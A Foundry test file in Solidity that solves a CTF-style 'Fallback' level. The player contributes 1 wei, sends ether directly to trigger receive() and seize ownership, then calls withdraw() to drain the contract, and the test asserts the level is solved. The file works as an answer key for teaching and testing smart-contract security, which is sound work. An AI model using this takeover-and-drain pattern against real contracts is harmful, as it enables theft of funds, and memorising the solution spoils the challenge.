// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {FallbackFactory} from "../../src/levels/FallbackFactory.sol";
import {Fallback} from "../../src/levels/Fallback.sol";

contract FallbackLevel is LuxTest {
    FallbackFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new FallbackFactory();
        _register(factory);
    }

    function test_solve() public {
        address instance = _create(factory, player, 0);
        _assertUnsolved(instance, player);

        vm.deal(player, 1 ether);
        vm.startPrank(player, player);
        Fallback(payable(instance)).contribute{value: 1 wei}();
        (bool ok,) = instance.call{value: 1 wei}(""); // hit receive() -> owner = player
        require(ok, "receive failed");
        Fallback(payable(instance)).withdraw(); // drain to owner (player)
        vm.stopPrank();

        assertEq(Fallback(payable(instance)).owner(), player);
        assertEq(instance.balance, 0);
        _assertSolved(factory, instance, player);
    }
}
